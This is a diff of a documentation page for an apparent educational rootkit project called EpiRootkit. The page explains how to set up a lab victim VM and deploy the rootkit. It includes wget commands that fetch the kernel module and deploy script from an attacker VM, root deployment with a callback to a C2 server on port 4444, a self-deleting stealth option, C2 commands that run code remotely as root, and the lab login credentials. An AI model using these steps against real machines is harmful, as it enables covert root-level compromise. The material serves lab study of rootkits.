@@ -1,33 +1,79 @@
 ---
 title: "Victim VM Setup"
-description: "Configure and use the victim VM to load EpiRootkit"
-icon: "code"
+description: "Configure the victim VM and deploy the EpiRootkit"
+icon: "shield"
 date: "2025-05-07T00:44:31+01:00"
-lastmod: "2025-05-12T00:00:00+01:00"
+lastmod: "2025-05-25T00:00:00+01:00"
 draft: false
 toc: true
 weight: 204
 ---
 
-Follow these steps once the host environment is ready and the VMs have been created or downloaded.
+# Victim VM Setup
 
+Deploy the EpiRootkit kernel module on the victim system.
 
-1. Place the `victim.qcow2` disk in the `vm/` directory at the project root (verify via `./scripts/check_vms.sh` or see [VM Installation & Verification]({{< relref "vm-installation.md" >}})).
+## Prerequisites
 
-2. Launch the victim VM with:
-   ```bash
-   sudo ./scripts/run_vms.sh victim
-   ```
-   Or both VMs with:
-   ```bash
-   sudo ./scripts/run_vms.sh
-   ```
+1. **Host setup complete**: [Host Environment Setup]({{< relref "environment.md" >}})
+2. **VM downloaded**: `vm/victim.qcow2` in project root
+3. **VM launched**: `sudo ./scripts/run_vms.sh victim`
 
-3. On the victim VM:
-   - The VM has auto-login enabled for the `victim` user (no password prompt).  
-   - Its static IP is **192.168.200.10**.
-   - The password is `jules`.
+## VM Access
 
+**Connection Details:**
+- **IP Address**: 192.168.200.10 (static)
+- **Username**: `victim` / **Password**: `jules`
+- **Target**: Ubuntu 20.04 LTS with kernel 5.4.0
 
+## Deployment Process
 
-4. When finished, close the QEMU window or use **Ctrl+C** on the host script to shut down both VMs. 
+### 1. Receive Payload
+Get the rootkit files from the attacker VM:
+
+```bash
+# Option A: HTTP download
+wget http://192.168.200.11:8080/epirootkit.ko
+wget http://192.168.200.11:8080/deploy_rootkit.sh
+
+# Option B: SCP transfer
+# Files transferred by attacker to victim@192.168.200.10:~/
+
+# Option C: Web UI upload
+# Use attacker's web interface file transfer panel
+```
+
+### 2. Deploy Rootkit
+```bash
+# Simple deployment (connects to 192.168.200.11:4444)
+sudo ./deploy_rootkit.sh
+
+# Custom C2 server
+sudo ./deploy_rootkit.sh address=IP port=PORT
+
+# Stealth deployment (self-destructs)
+sudo ./deploy_rootkit.sh --self-delete
+```
+
+### 3. Verify Connection
+Switch to attacker VM C2 server:
+```bash
+c2-server$ ls
+# • Client-1 - UNAUTHENTICATED - Last seen: Just now
+
+c2-server$ auth Client-1 password
+c2-server$ exec Client-1 whoami
+# Exit code: 0, Output: root
+```
+
+## Management
+
+```bash
+# Check status
+sudo ./deploy_rootkit.sh status
+
+# Remove rootkit
+sudo ./deploy_rootkit.sh uninstall
+```
+
+For detailed deployment script options, see [EpiRootkit Deployment](../../05-epirootkit/deployment.md).
